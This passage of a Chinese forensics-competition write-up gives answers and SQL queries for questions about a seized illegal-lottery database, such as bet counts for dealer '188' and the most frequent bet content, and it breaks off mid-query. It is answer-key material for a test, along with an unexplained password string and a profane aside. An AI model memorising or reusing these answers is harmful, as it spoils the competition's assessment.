class=&quot;ne-text&quot;&gt;我预感是这两个&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;ubb2da90b&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;没找到。&lt;/span&gt;&lt;/p&gt;&lt;/details&gt;
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762154647033-fe326d0a-db3f-418c-8ec6-8ec3835ba61b.png)
+
+你妈逼擦肩而过，，
+
+`3;s=]-`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762154755512-fa1083eb-b57a-4e8d-bfc2-64f98822e6dd.png)
+
+`935629`
+
+## 88、接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）（ ）
+闪退不做了。
+
+# 数据分析
+ai题目。有空来做。
+
+## 89、通过对检材“01-lott.sql”文件进行分析，统计庄家&quot;188&quot;在2021-05-10当日的电子投注总笔数（答案格式：1）（ ）
+
+
+1. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;目标&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：统计庄家&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;188&quot;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;在&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;2021-05-10&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;当日的电子投注总笔数。&lt;/font&gt;
+2. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;数据来源&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;数据库：&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;lott&lt;/font&gt;`
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表名：通过查询得知为&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_trade_betrecord&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;。&lt;/font&gt;
+3. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;关键字段&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;庄家 ID 字段：&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;（代表庄家编号）。&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;投注时间字段：&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CreateTime&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;（格式为&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;YYYY-MM-DD HH:MM:SS&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;）。&lt;/font&gt;
+4. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;过滤条件&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper = &#39;188&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选出庄家为&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;188&quot;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;的记录。&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;时间范围：&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CreateTime &gt;= &#39;2021-05-10 00:00:00&#39; AND CreateTime &lt;= &#39;2021-05-10 23:59:59&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;，确保只统计当天的数据。&lt;/font&gt;
+5. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;结果要求&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用 &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;COUNT(*)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; 统计符合条件的记录总数。&lt;/font&gt;
+
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) AS total_bets</span><br><span class="line"></span><br><span class="line">FROM t_trade_betrecord</span><br><span class="line"></span><br><span class="line">WHERE Keeper = &#x27;188&#x27;</span><br><span class="line"></span><br><span class="line">  AND CreateTime &gt;= &#x27;2021-05-10 00:00:00&#x27;</span><br><span class="line"></span><br><span class="line">  AND CreateTime &lt;= &#x27;2021-05-10 23:59:59&#x27;;</span><br></pre></td></tr></table></figure>
+
+#### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;解释：&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;COUNT(*)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：计算满足 WHERE 条件的所有行数。&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper = &#39;188&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选庄家编号为&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;188&quot;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;的投注记录。&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CreateTime&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;范围限制在&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;2021-05-10&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;整天的时间范围内。&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;此查询直接从数据库中提取并统计了指定条件下的投注笔数，最终返回的结果即为所需答案。&lt;/font&gt;
+
+## 90、通过对检材“01-lott.sql”文件进行分析，统计t_trade_betrecord中庄家&quot;188&quot;记录中彩票类型为&quot;jnd28&quot;且期号在t_lottery_jnd表中存在的记录数。（答案格式：1）（ ）
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;我们需要从数据库中统计满足以下条件的记录数：&lt;/font&gt;
+
+1. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表来源&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;主要数据来源于&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_trade_betrecord&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表，它存储了彩票投注记录。&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;需要关联查询&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表，用于验证投注记录中的期号是否存在。&lt;/font&gt;
+2. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;过滤条件&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;投注记录属于庄家&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;188&quot;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：在查询中我们假设该信息存储于&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;列中（因为原始表结构未显示明确的庄家ID列）。&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;彩票类型为&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;jnd28&quot;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;LotteryType&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;列进行筛选。&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;记录中的期号必须存在于&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表中：使用&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Issue&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;列与&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表的&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;issue&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;列做匹配校验。&lt;/font&gt;
+3. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;结果要求&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;统计符合以上所有条件的记录总数。&lt;/font&gt;
+
+---
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;实际执行的 SQL 查询代码如下：&lt;/font&gt;
+
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) AS total_count</span><br><span class="line"></span><br><span class="line">FROM t_trade_betrecord b</span><br><span class="line"></span><br><span class="line">WHERE b.Keeper = &#x27;188&#x27; </span><br><span class="line"></span><br><span class="line">  AND b.LotteryType = &#x27;jnd28&#x27;</span><br><span class="line"></span><br><span class="line">  AND EXISTS (</span><br><span class="line"></span><br><span class="line">    SELECT 1 </span><br><span class="line"></span><br><span class="line">    FROM t_lottery_jnd j </span><br><span class="line"></span><br><span class="line">    WHERE j.issue = b.Issue</span><br><span class="line"></span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
+
+#### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;查询说明：&lt;/font&gt;
++ &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;COUNT(*)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;来统计符合条件的总行数。&lt;/font&gt;
++ &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;在&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;WHERE&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;子句中：&lt;/font&gt;
+    - `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;b.Keeper = &#39;188&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;是用来限定庄家为 &quot;188&quot; 的记录。&lt;/font&gt;
+    - `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;b.LotteryType = &#39;jnd28&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;是用来筛选彩票种类是 &quot;jnd28&quot; 的记录。&lt;/font&gt;
+    - `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;EXISTS(...)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;保证投注记录对应的期号 (&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Issue&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;) 必须出现在&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表中。&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;此查询已成功运行并返回结果为 &lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;92,842&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; 条满足条件的记录。&lt;/font&gt;
+
+## 91、通过对检材“01-lott.sql”文件进行分析，统计庄家&quot;188&quot;的玩家在2021-05-10当日：电子投注内容出现频率最高的电子投注内容是什么？（答案格式：按照实际情况填写）（ ）
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;我们需要从数据库中找出庄家&quot;188&quot;的玩家在2021-05-10当日电子投注内容出现频率最高的内容。具体步骤如下：&lt;/font&gt;
+
+1. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表来源&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;数据来源于&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_trade_betrecord&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表，它存储了彩票投注记录。&lt;/font&gt;
+2. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;过滤条件&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;庄家为 &quot;188&quot;：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段进行筛选&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;投注日期为 2021-05-10：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CreateTime&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段进行筛选&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;只考虑有效的投注记录（status=1）&lt;/font&gt;
+3. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;统计逻辑&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;按照投注内容 (&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Content&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段) 进行分组&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;统计每个投注内容的出现次数&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;按出现次数降序排列&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;取第一条记录作为频率最高的内容&lt;/font&gt;
+
+---
+
+### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;实际执行的 SQL 查询代码如下：&lt;/font&gt;
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT Content, COUNT(*) as frequency</span><br><span class="line">FROM lott.t_trade_betrecord</span><br><span class="line">WHERE Keeper = &#x27;188&#x27; </span><br><span class="line">  AND DATE(CreateTime) = &#x27;2021-05-10&#x27;</span><br><span class="line">  AND status = 1</span><br><span class="line">GROUP BY Content</span><br><span class="line">ORDER BY frequency DESC</span><br><span class="line">LIMIT 1;</span><br></pre></td></tr></table></figure>
+
+#### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;查询说明：&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper = &#39;188&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选庄家为&quot;188&quot;的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;DATE(CreateTime) = &#39;2021-05-10&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选2021年5月10日的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;status = 1&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：只考虑有效状态的投注记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;GROUP BY Content&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：按投注内容分组&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;COUNT(*) as frequency&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：计算每种投注内容的出现频次&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ORDER BY frequency DESC&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：按频次降序排列&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;LIMIT 1&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：只取频率最高的第一条记录&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;此查询已成功运行并返回结果为 &lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;500单&quot;&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;，出现了39次，是2021-05-10当日庄家&quot;188&quot;玩家中最常见的电子投注内容。&lt;/font&gt;
+
+## 92、通过对检材“01-lott.sql”文件进行分析，关联t_trade_betrecord与t_lottery_jnd表，分析庄家&quot;188&quot;在2021-05-10投注&quot;jnd28&quot;时：当开奖结果为&quot;大&quot;时，玩家投注包含&quot;小&quot;的笔数占比（使用双位数格式，答案格式：11.11%）（ ）
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;我们需要分析庄家&quot;188&quot;在2021-05-10投注&quot;jnd28&quot;时，当开奖结果为&quot;大&quot;时玩家投注包含&quot;小&quot;的笔数占比。具体步骤如下：&lt;/font&gt;
+
+1. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表关联&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;关联&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_trade_betrecord&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;和&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;表，通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Issue&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段进行连接&lt;/font&gt;
+2. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;过滤条件&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;庄家为 &quot;188&quot;：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Keeper&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段筛选&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;彩票类型为 &quot;jnd28&quot;：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;LotteryType&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字筛选&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;投注日期为 2021-05-10：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CreateTime&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段筛选&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;开奖结果为&quot;大&quot;：通过&lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;t_lottery_jnd.R_B_M&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt; &lt;/font&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;字段筛选&lt;/font&gt;
+3. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;计算逻辑&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;统计开奖结果为&quot;大&quot;时的总投注笔数&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;统计其中投注内容包含&quot;小&quot;的笔数&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;计算占比并格式化为双位数百分比&lt;/font&gt;
+
+---
+
+### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;实际执行的 SQL 查询代码如下：&lt;/font&gt;
+<figure class="highlight sql" data-language="sql" data-language-label="SQL"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    CONCAT(FORMAT((<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> b.Content <span class="keyword">LIKE</span> <span class="string">&#x27;%小%&#x27;</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="operator">*</span> <span class="number">100.0</span> <span class="operator">/</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)), <span class="number">2</span>), <span class="string">&#x27;%&#x27;</span>) <span class="keyword">AS</span> percentage</span><br><span class="line"><span class="keyword">FROM</span> lott.t_trade_betrecord b</span><br><span class="line"><span class="keyword">JOIN</span> lott.t_lottery_jnd j <span 